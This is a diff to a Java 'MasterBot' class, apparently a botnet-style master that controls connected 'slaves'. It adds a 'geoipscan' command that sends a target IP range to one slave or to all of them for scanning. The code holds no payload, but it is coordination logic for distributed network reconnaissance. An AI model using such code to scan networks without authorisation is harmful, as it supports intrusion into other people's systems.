@@ -358,7 +358,7 @@ public class MasterBot extends Thread
 					continue;
 				}
                                 
-                                //tcpportscan
+                                //ipscan
                                 else if (cli.startsWith("ipscan"))
 				{
                                     
@@ -424,6 +424,73 @@ public class MasterBot extends Thread
 					}
 					continue;
 				}                                
+                                
+                                //geoipscan
+                                else if (cli.startsWith("geoipscan"))
+				{
+                                    
+					// slave count = 0
+					if(connectedSlaves == 0)
+					{
+						System.out.println("No Slaves are currently connected.");
+						continue;
+					}
+					
+					String[] dataArray = cli.split("\\s+");
+					// 
+					if(dataArray.length == 3)
+					{
+						slaveIP = dataArray[1];
+						targetIP = dataArray[2];
+                                                
+                                                String[] targetIPRange = dataArray[2].split("\\-");
+                                                targetIPStart = targetIPRange[0];
+                                                targetIPEnd = targetIPRange[1];
+                                                
+  
+
+					}
+					
+					// all slaves
+					if (slaveIP.equalsIgnoreCase("all"))
+					{
+                                            
+                                            
+//                                                                                                            System.out.println("Comes to ALL" + targetPortStart + " " + targetPortEnd);
+
+						for(int i=0; i<slaveList.size(); i++)
+						{
+//							        System.out.println("Sends DATA" + targetPortStart + " " + targetPortEnd);
+
+								sb.geoipscan(slaveList.get(i), targetIPStart, targetIPEnd);
+
+						
+						}
+					}
+					// specific slave (must enter "ip:port")
+					else
+					{
+						String ipCheck, hostNameCheck;
+						for(int i=0; i<slaveList.size(); i++)
+						{
+							ipCheck = "/"+slaveIP;
+                                                        hostNameCheck = slaveIP;
+
+							if(ipCheck.equalsIgnoreCase(slaveList.get(i).getRemoteSocketAddress().toString()))
+							{
+								sb.geoipscan(slaveList.get(i), targetIPStart, targetIPEnd);
+								
+							}
+                                                        else if(hostNameCheck.equalsIgnoreCase("Slave" + (i+1)))
+                                                        {
+								
+								sb.geoipscan(slaveList.get(i), targetIPStart, targetIPEnd);
+								
+                                                        } 
+						}
+					}
+					continue;
+				}                                      
                                 
 				// exit
 				else if (cli.equalsIgnoreCase("exit")) 
